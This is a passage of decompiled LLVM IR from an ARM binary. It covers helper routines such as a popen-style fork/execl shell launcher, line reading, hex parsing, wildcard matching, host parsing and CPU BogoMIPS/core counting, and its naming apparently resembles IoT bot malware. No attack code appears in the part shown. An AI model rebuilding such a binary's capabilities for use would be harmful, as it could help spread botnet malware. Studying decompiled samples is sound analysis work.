dec_label_pc_8ea8:                                ; preds = %dec_label_pc_8e98
  %v0_8ea8 = call i32 @getdtablesize()
  %v5_8ebc = icmp sgt i32 %v0_8ea8, 0
  br i1 %v5_8ebc, label %dec_label_pc_8ecc, label %dec_label_pc_8ec0

dec_label_pc_8ec0:                                ; preds = %dec_label_pc_8ea8
  br label %dec_label_pc_9084

dec_label_pc_8ecc:                                ; preds = %dec_label_pc_8ea8
  %v3_8ed0 = mul i32 %v0_8ea8, 4
  %v1_8ed8 = call i32 @malloc(i32 %v3_8ed0)
  store i32 %v1_8ed8, i32* @global_var_2cc5c.37, align 4
  %v2_8ef4 = icmp eq i32 %v1_8ed8, 0
  br i1 %v2_8ef4, label %dec_label_pc_8efc, label %dec_label_pc_8f08

dec_label_pc_8efc:                                ; preds = %dec_label_pc_8ecc
  br label %dec_label_pc_9084

dec_label_pc_8f08:                                ; preds = %dec_label_pc_8ecc
  store i32 %v3_8ed0, i32* @r2, align 4
  %v2_8f28 = inttoptr i32 %v1_8ed8 to i8*
  %v3_8f28 = call i32 @__GI_memset(i8* %v2_8f28, i32 0)
  br label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8e98, %dec_label_pc_8f08
  %v0_8f2c = call i32 @__vfork()
  %v7_8f44 = icmp eq i32 %v0_8f2c, -1
  br i1 %v7_8f44, label %dec_label_pc_8f5c, label %dec_label_pc_8f4c

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f2c
  %v2_8f50 = icmp eq i32 %v0_8f2c, 0
  %v2_8f84 = load i8, i8* %arg2, align 1
  %v7_8f88 = icmp eq i8 %v2_8f84, 114
  br i1 %v2_8f50, label %dec_label_pc_8f80, label %dec_label_pc_9020

dec_label_pc_8f5c:                                ; preds = %dec_label_pc_8f2c
  %v3_8f5c = load i32, i32* %stack_var_-32, align 4
  %v1_8f64 = call i32 @__libc_close(i32 %v3_8f5c)
  %v1_8f70 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_9084

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_8f90, label %dec_label_pc_8fc8

dec_label_pc_8f90:                                ; preds = %dec_label_pc_8f80
  %v7_8f94 = icmp eq i32 %tmp3, 1
  br i1 %v7_8f94, label %dec_label_pc_8fb8, label %dec_label_pc_8f9c

dec_label_pc_8f9c:                                ; preds = %dec_label_pc_8f90
  %v0_8fa8 = call i32 @dup2()
  %v1_8fb4 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %dec_label_pc_8f90, %dec_label_pc_8f9c
  %v3_8fb8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fc0 = call i32 @__libc_close(i32 %v3_8fb8)
  br label %dec_label_pc_8ffc

dec_label_pc_8fc8:                                ; preds = %dec_label_pc_8f80
  %v3_8fc8 = load i32, i32* %stack_var_-32, align 4
  %v2_8fcc = icmp eq i32 %v3_8fc8, 0
  br i1 %v2_8fcc, label %dec_label_pc_8ff0, label %dec_label_pc_8fd4

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc8
  %v0_8fe0 = call i32 @dup2()
  %v3_8fe4 = load i32, i32* %stack_var_-32, align 4
  %v1_8fec = call i32 @__libc_close(i32 %v3_8fe4)
  br label %dec_label_pc_8ff0

dec_label_pc_8ff0:                                ; preds = %dec_label_pc_8fc8, %dec_label_pc_8fd4
  %v1_8ff8 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_8ffc

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8fb8, %dec_label_pc_8ff0
  %v8_9014 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1bfb8.39 to i32), i32 ptrtoint ([3 x i8]* @global_var_1bfc0.41 to i32), i32 ptrtoint ([3 x i8]* @global_var_1bfc4.43 to i32), i32 %arg1, i32 0)
  %v1_901c = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_9020:                                ; preds = %dec_label_pc_8f4c
  br i1 %v7_8f88, label %dec_label_pc_9030, label %dec_label_pc_9048

dec_label_pc_9030:                                ; preds = %dec_label_pc_9020
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9040 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_905c

dec_label_pc_9048:                                ; preds = %dec_label_pc_9020
  %v3_9050 = load i32, i32* %stack_var_-32, align 4
  %v1_9058 = call i32 @__libc_close(i32 %v3_9050)
  br label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9030, %dec_label_pc_9048
  %stack_var_-40.0 = phi i32 [ %v3_9030, %dec_label_pc_9030 ], [ %tmp3, %dec_label_pc_9048 ]
  %v3_9060 = mul i32 %stack_var_-40.0, 4
  %v2_906c = load i32, i32* @global_var_2cc5c.37, align 4
  %v2_9070 = add i32 %v2_906c, %v3_9060
  %v2_9078 = inttoptr i32 %v2_9070 to i32*
  store i32 %v0_8f2c, i32* %v2_9078, align 4
  br label %dec_label_pc_9084

dec_label_pc_9084:                                ; preds = %dec_label_pc_8f5c, %dec_label_pc_8efc, %dec_label_pc_8ec0, %dec_label_pc_8e8c, %dec_label_pc_8e68, %dec_label_pc_905c
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8e8c ], [ -1, %dec_label_pc_8efc ], [ -1, %dec_label_pc_8f5c ], [ %stack_var_-40.0, %dec_label_pc_905c ], [ -1, %dec_label_pc_8ec0 ], [ -1, %dec_label_pc_8e68 ]
  store i32 %v3_8e20, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f2c, { 1, 2, 0 }
  uselistorder i32 %v3_8ed0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 5, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_9084, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_905c, { 1, 0 }
  uselistorder label %dec_label_pc_8ffc, { 1, 0 }
  uselistorder label %dec_label_pc_8ff0, { 1, 0 }
  uselistorder label %dec_label_pc_8fb8, { 1, 0 }
  uselistorder label %dec_label_pc_8f2c, { 1, 0 }
  uselistorder label %dec_label_pc_8e68, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-276 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_90a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_90a4, i32* @ip, align 4
  %v2_90bc = load i32, i32* @global_var_2cc5c.37, align 4
  %v2_90c0 = icmp eq i32 %v2_90bc, 0
  br i1 %v2_90c0, label %dec_label_pc_9214, label %dec_label_pc_90c8

dec_label_pc_90c8:                                ; preds = %entry
  %v3_90cc = mul i32 %arg1, 4
  %v2_90dc = add i32 %v2_90bc, %v3_90cc
  %v1_90e0 = inttoptr i32 %v2_90dc to i32*
  %v2_90e0 = load i32, i32* %v1_90e0, align 4
  %v2_90e4 = icmp eq i32 %v2_90e0, 0
  br i1 %v2_90e4, label %dec_label_pc_9214, label %dec_label_pc_90f8

dec_label_pc_90f8:                                ; preds = %dec_label_pc_90c8
  %v1_90fc = call i32 @__libc_close(i32 %arg1)
  %v2_9100 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9100, i32* @r0, align 4
  %v1_9108 = call i32 @sigemptyset(i32 %v2_9100)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9118 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 2)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9128 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 3)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9138 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 1)
  %v2_9140 = ptrtoint i32* %stack_var_-148 to i32
  %v3_914c = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_914c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_914c, i32 %v2_9140)
  %v2_916c = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9194, %dec_label_pc_90f8
  %v2_9160 = load i32, i32* @global_var_2cc5c.37, align 4
  %v2_9164 = add i32 %v2_9160, %v3_90cc
  %v1_9168 = inttoptr i32 %v2_9164 to i32*
  %v2_9168 = load i32, i32* %v1_9168, align 4
  %v3_917c = call i32 @__libc_waitpid(i32 %v2_9168, i32 %v2_916c, i32 0)
  %v3_918c = icmp eq i32 %v3_917c, -1
  %v8_918c = icmp eq i32 %v3_917c, -1
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91a8

dec_label_pc_9194:                                ; preds = %dec_label_pc_9150
  %v0_9194 = call i32 @__errno_location()
  %v1_919c = inttoptr i32 %v0_9194 to i32*
  %v2_919c = load i32, i32* %v1_919c, align 4
  %v7_91a0 = icmp eq i32 %v2_919c, 4
  br i1 %v7_91a0, label %dec_label_pc_9150, label %dec_label_pc_91a8

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9150, %dec_label_pc_9194
  %v3_91b8 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_91b8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_91b8, i32 0)
  %v3_91c0 = mul i32 %tmp6, 4
  %v2_91cc = load i32, i32* @global_var_2cc5c.37, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 0, i32* %v2_91d8, align 4
  br i1 %v8_918c, label %dec_label_pc_9214, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91a8
  %v3_91e8 = load i32, i32* %stack_var_-280, align 4
  %v1_91f4 = and i32 %v3_91e8, 65280
  %v3_91f81 = udiv i32 %v1_91f4, 256
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91e8, %dec_label_pc_91a8, %entry, %dec_label_pc_90c8
  %storemerge4 = phi i32 [ -1, %dec_label_pc_90c8 ], [ -1, %entry ], [ %v3_91f81, %dec_label_pc_91e8 ], [ -1, %dec_label_pc_91a8 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9100, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_90cc, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2cc5c.37, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_9298

dec_label_pc_9258:                                ; preds = %dec_label_pc_92a8
  store i32 %v2_92b4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9274 = call i32 @__libc_read(i32 %arg3)
  %v1_9284 = add nuw i32 %storemerge25, 1
  %v7_9290 = icmp eq i32 %v1_9274, 1
  br i1 %v7_9290, label %dec_label_pc_9298, label %dec_label_pc_92c8

dec_label_pc_9298:                                ; preds = %entry, %dec_label_pc_9258
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9284, %dec_label_pc_9258 ]
  %v6_92a4 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a4, label %dec_label_pc_92a8, label %dec_label_pc_92c8

dec_label_pc_92a8:                                ; preds = %dec_label_pc_9298
  %v2_92b4 = add i32 %storemerge25, %arg1
  %v1_92b8 = add i32 %v2_92b4, -1
  %v1_92bc = inttoptr i32 %v1_92b8 to i8*
  %v2_92bc = load i8, i8* %v1_92bc, align 1
  %v7_92c0 = icmp eq i8 %v2_92bc, 10
  br i1 %v7_92c0, label %dec_label_pc_92c8, label %dec_label_pc_9258

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a8, %dec_label_pc_9298, %dec_label_pc_9258
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a8 ], [ 1, %dec_label_pc_9298 ], [ %v1_9274, %dec_label_pc_9258 ]
  %v2_92cc = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92cc, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_9274, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_934c4 = load i8, i8* %arg1, align 1
  %v2_93506 = icmp eq i8 %v2_934c4, 0
  br i1 %v2_93506, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9318:                                ; preds = %dec_label_pc_9358
  %v3_931c = mul i32 %stack_var_-20.07, 16
  %v4_9320 = ptrtoint i8* %v3_933c to i32
  %v2_9324 = load i8, i8* %v3_933c, align 1
  %v3_9324 = zext i8 %v2_9324 to i32
  %v4_9330 = mul nuw nsw i32 %v3_9324, 4
  %v5_9330 = add i32 %v4_9330, ptrtoint (i32* @global_var_1bfc8.46 to i32)
  %v6_9330 = inttoptr i32 %v5_9330 to i32*
  %v7_9330 = load i32, i32* %v6_9330, align 4
  %v2_9334 = or i32 %v7_9330, %v3_931c
  %v1_9340 = add i32 %v4_9320, 1
  %v5_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_934c = load i8, i8* %v5_9344, align 1
  %v2_9350 = icmp eq i8 %v2_934c, 0
  br i1 %v2_9350, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %entry, %dec_label_pc_9318
  %v3_933c = phi i8* [ %v5_9344, %dec_label_pc_9318 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_9334, %dec_label_pc_9318 ], [ 0, %entry ]
  %v1_935c = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_935c, label %dec_label_pc_9364, label %dec_label_pc_9318

dec_label_pc_9364:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9358, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9334, %dec_label_pc_9318 ], [ %stack_var_-20.07, %dec_label_pc_9358 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9358, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  %v6_937c = load i32, i32* @fp, align 4
  store i32 37764, i32* %stack_var_-4, align 4
  %v2_9380 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9380, i32* @fp, align 4
  %v2_9394 = load i8, i8* %arg1, align 1
  %v7_93a0 = icmp eq i8 %v2_9394, 42
  br i1 %v7_93a0, label %dec_label_pc_93d4, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %entry
  %v7_93ac = icmp eq i8 %v2_9394, 63
  br i1 %v7_93ac, label %dec_label_pc_9444, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  %v2_93b8 = icmp eq i8 %v2_9394, 0
  br i1 %v2_93b8, label %dec_label_pc_93c4, label %dec_label_pc_949c

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93b4
  %v2_93c8 = load i8, i8* %tmp, align 1
  %v3_93c8 = zext i8 %v2_93c8 to i32
  br label %dec_label_pc_9510

dec_label_pc_93d4:                                ; preds = %entry
  %v1_93d8 = add i32 %tmp8, 1
  %v3_93e4 = inttoptr i32 %v1_93d8 to i8*
  %v4_93e4 = call i32 @wildString(i8* %v3_93e4, i32 %arg2)
  %v2_93ec = icmp eq i32 %v4_93e4, 0
  br i1 %v2_93ec, label %dec_label_pc_9430, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %dec_label_pc_93d4
  %v2_93f8 = load i8, i8* %tmp, align 1
  %v2_93fc = icmp eq i8 %v2_93f8, 0
  br i1 %v2_93fc, label %dec_label_pc_9438, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4
  %v1_9408 = add i32 %arg2, 1
  %v4_9414 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9408)
  %v2_941c = icmp eq i32 %v4_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9438

dec_label_pc_9430:                                ; preds = %dec_label_pc_9404, %dec_label_pc_93d4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404, %dec_label_pc_9430
  %storemerge3 = phi i32 [ 0, %dec_label_pc_9430 ], [ 1, %dec_label_pc_9404 ], [ 1, %dec_label_pc_93f4 ]
  br label %dec_label_pc_9510

dec_label_pc_9444:                                ; preds = %dec_label_pc_93a8
  %v2_9448 = load i8, i8* %tmp, align 1
  %v2_944c = icmp eq i8 %v2_9448, 0
  br i1 %v2_944c, label %dec_label_pc_9490, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v1_9458 = add i32 %tmp8, 1
  %v1_9460 = add i32 %arg2, 1
  %v2_946c = inttoptr i32 %v1_9458 to i8*
  %v3_946c = call i32 @wildString(i8* %v2_946c, i32 %v1_9460)
  %v2_9474 = icmp ne i32 %v3_946c, 0
  %. = zext i1 %v2_9474 to i32
  br label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9454, %dec_label_pc_9444
  %storemerge2 = phi i32 [ 1, %dec_label_pc_9444 ], [ %., %dec_label_pc_9454 ]
  br label %dec_label_pc_9510

dec_label_pc_949c:                                ; preds = %dec_label_pc_93b4
  %v2_94a0 = load i8, i8* %arg1, align 1
  %v3_94a0 = zext i8 %v2_94a0 to i32
  %v1_94a8 = call i32 @__GI_toupper(i32 %v3_94a0)
  store i32 %v1_94a8, i32* @r4, align 4
  %v2_94b4 = load i8, i8* %tmp, align 1
  %v3_94b4 = zext i8 %v2_94b4 to i32
  %v1_94bc = call i32 @__GI_toupper(i32 %v3_94b4)
  %v0_94c4 = load i32, i32* @r4, align 4
  %v9_94c4 = icmp eq i32 %v0_94c4, %v1_94bc
  br i1 %v9_94c4, label %dec_label_pc_94cc, label %dec_label_pc_9508

dec_label_pc_94cc:                                ; preds = %dec_label_pc_949c
  %v1_94d0 = add i32 %tmp8, 1
  %v1_94d8 = add i32 %arg2, 1
  %v2_94e4 = inttoptr i32 %v1_94d0 to i8*
  %v3_94e4 = call i32 @wildString(i8* %v2_94e4, i32 %v1_94d8)
  %v2_94ec = icmp ne i32 %v3_94e4, 0
  %.7 = zext i1 %v2_94ec to i32
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_949c
  %storemerge = phi i32 [ 1, %dec_label_pc_949c ], [ %.7, %dec_label_pc_94cc ]
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9490, %dec_label_pc_9438, %dec_label_pc_93c4, %dec_label_pc_9508
  %stack_var_-44.0 = phi i32 [ %storemerge3, %dec_label_pc_9438 ], [ %storemerge2, %dec_label_pc_9490 ], [ %v3_93c8, %dec_label_pc_93c4 ], [ %storemerge, %dec_label_pc_9508 ]
  store i32 %v3_937c, i32* @r4, align 4
  store i32 %v6_937c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9510, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9438, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9540 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9540, i32* %arg2, align 4
  %v3_9558 = icmp eq i32 %v1_9540, -1
  %. = zext i1 %v3_9558 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9594 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9594 to i8*
  store i8* %storemerge2, i8** %stack_var_-20, align 4
  %v2_95cc3 = load i8, i8* %storemerge2, align 1
  %v2_95d05 = icmp eq i8 %v2_95cc3, 0
  br i1 %v2_95d05, label %dec_label_pc_95d8, label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %entry, %dec_label_pc_959c
  %v2_95d88 = phi i8* [ %storemerge, %dec_label_pc_959c ], [ %storemerge2, %entry ]
  %v2_95a0 = load i8, i8* %v2_95d88, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = call i32 @__GI_toupper(i32 %v3_95a0)
  store i32 %v1_95a8, i32* %r0.global-to-local, align 4
  %v3_95b4 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b8 = trunc i32 %v1_95a8 to i8
  store i8 %v1_95b8, i8* %v3_95b4, align 1
  %v4_95bc = ptrtoint i8* %v3_95b4 to i32
  %v1_95c0 = add i32 %v4_95bc, 1
  %storemerge = inttoptr i32 %v1_95c0 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95cc = load i8, i8* %storemerge, align 1
  %v2_95d0 = icmp eq i8 %v2_95cc, 0
  br i1 %v2_95d0, label %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, label %dec_label_pc_959c

dec_label_pc_95c8.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_959c
  %v13_95d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, %entry
  %v13_95d8 = phi i32 [ %v13_95d8.pre, %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge ], [ %v0_9594, %entry ]
  ret i32 %v13_95d8

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @fp, align 4
  store i32 %v3_95e0, i32* %stack_var_-16, align 4
  %v13_95e0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v13_95e0, i32* @r2, align 4
  %v4_9608 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1c3c8.48, i32 0, i32 0), i32 0)
  %v2_97cc = ptrtoint i32* %stack_var_-4120 to i32
  %v1_9628 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_97c4

dec_label_pc_9618:                                ; preds = %dec_label_pc_97c4
  %v2_9628 = call i32 @uppercase(i8* %v1_9628)
  %v4_9640 = call i32 @strstr(i32 %v2_97cc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1c3d8.50, i32 0, i32 0))
  %v9_9658 = icmp eq i32 %v4_9640, %v2_97cc
  br i1 %v9_9658, label %dec_label_pc_9660, label %dec_label_pc_97a8

dec_label_pc_9660:                                ; preds = %dec_label_pc_9618
  %tmp18 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_9684

dec_label_pc_9678:                                ; preds = %dec_label_pc_96a4, %dec_label_pc_9694, %dec_label_pc_9684
  %v1_967c = add i32 %v4_9684, 1
  %v5_9680 = inttoptr i32 %v1_967c to i8*
  br label %dec_label_pc_9684

dec_label_pc_9684:                                ; preds = %dec_label_pc_9660, %dec_label_pc_9678
  %storemerge2 = phi i8* [ %v5_9680, %dec_label_pc_9678 ], [ %tmp18, %dec_label_pc_9660 ]
  %v4_9684 = ptrtoint i8* %storemerge2 to i32
  %v2_9688 = load i8, i8* %storemerge2, align 1
  %v7_968c = icmp eq i8 %v2_9688, 32
  br i1 %v7_968c, label %dec_label_pc_9678, label %dec_label_pc_9694

dec_label_pc_9694:                                ; preds = %dec_label_pc_9684
  %v2_9698 = load i8, i8* %storemerge2, align 1
  %v7_969c = icmp eq i8 %v2_9698, 9
  br i1 %v7_969c, label %dec_label_pc_9678, label %dec_label_pc_96a4

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9694
  %v2_96a8 = load i8, i8* %storemerge2, align 1
  %v7_96ac = icmp eq i8 %v2_96a8, 58
  br i1 %v7_96ac, label %dec_label_pc_9678, label %dec_label_pc_96e0.preheader

dec_label_pc_96e0.preheader:                      ; preds = %dec_label_pc_96a4
  %v2_96f8 = add i32 %v4_9684, -1
  br label %dec_label_pc_96e0

dec_label_pc_96b8:                                ; preds = %dec_label_pc_96e0, %dec_label_pc_970c
  %v3_96c0 = call i32 @strlen(i8* %storemerge2)
  %v1_96d4 = add i32 %v2_96f8, %v3_96c0
  %v3_96dc = inttoptr i32 %v1_96d4 to i8*
  store i8 0, i8* %v3_96dc, align 1
  br label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96e0.preheader, %dec_label_pc_96b8
  %v3_96e8 = call i32 @strlen(i8* %storemerge2)
  %v1_96fc = add i32 %v3_96e8, %v2_96f8
  %v1_9700 = inttoptr i32 %v1_96fc to i8*
  %v2_9700 = load i8, i8* %v1_9700, align 1
  %v7_9704 = icmp eq i8 %v2_9700, 13
  br i1 %v7_9704, label %dec_label_pc_96b8, label %dec_label_pc_970c

dec_label_pc_970c:                                ; preds = %dec_label_pc_96e0
  %v3_9714 = call i32 @strlen(i8* %storemerge2)
  %v1_9728 = add i32 %v3_9714, %v2_96f8
  %v1_972c = inttoptr i32 %v1_9728 to i8*
  %v2_972c = load i8, i8* %v1_972c, align 1
  %v7_9730 = icmp eq i8 %v2_972c, 10
  br i1 %v7_9730, label %dec_label_pc_96b8, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_970c
  %v2_9744 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v2_974c = icmp eq i32 %v2_9744, 0
  br i1 %v2_974c, label %dec_label_pc_9770, label %dec_label_pc_9754

dec_label_pc_9754:                                ; preds = %dec_label_pc_9738
  %v2_9760 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v3_976c = inttoptr i32 %v2_9760 to i8*
  store i8 0, i8* %v3_976c, align 1
  br label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9738, %dec_label_pc_9754
  %v3_978c = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  %v1_9794 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_97a8:                                ; preds = %dec_label_pc_9618
  store i32 4096, i32* @r2, align 4
  %v3_97c0 = call i32 @__GI_memset(i8* %v1_9628, i32 0)
  br label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %entry, %dec_label_pc_97a8
  %v4_97dc = call i32 @fdgets(i32 %v2_97cc, i32 4096, i32 %v4_9608, i32 %v2_97cc)
  %v2_97e4 = icmp eq i32 %v4_97dc, 0
  br i1 %v2_97e4, label %dec_label_pc_97ec, label %dec_label_pc_9618

dec_label_pc_97ec:                                ; preds = %dec_label_pc_97c4
  %v1_97f0 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_9770, %dec_label_pc_97ec
  %storemerge4 = phi i32 [ 1, %dec_label_pc_97ec ], [ 0, %dec_label_pc_9770 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_96f8, { 1, 2, 0 }
  uselistorder i8* %storemerge2, { 0, 1, 3, 2, 4, 5, 7, 6 }
  uselistorder i32 %v2_97cc, { 0, 3, 1, 2 }
  uselistorder i32 %v4_9608, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_9800, { 1, 0 }
  uselistorder label %dec_label_pc_97c4, { 1, 0 }
  uselistorder label %dec_label_pc_9770, { 1, 0 }
  uselistorder label %dec_label_pc_96e0, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
  uselistorder label %dec_label_pc_9684, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
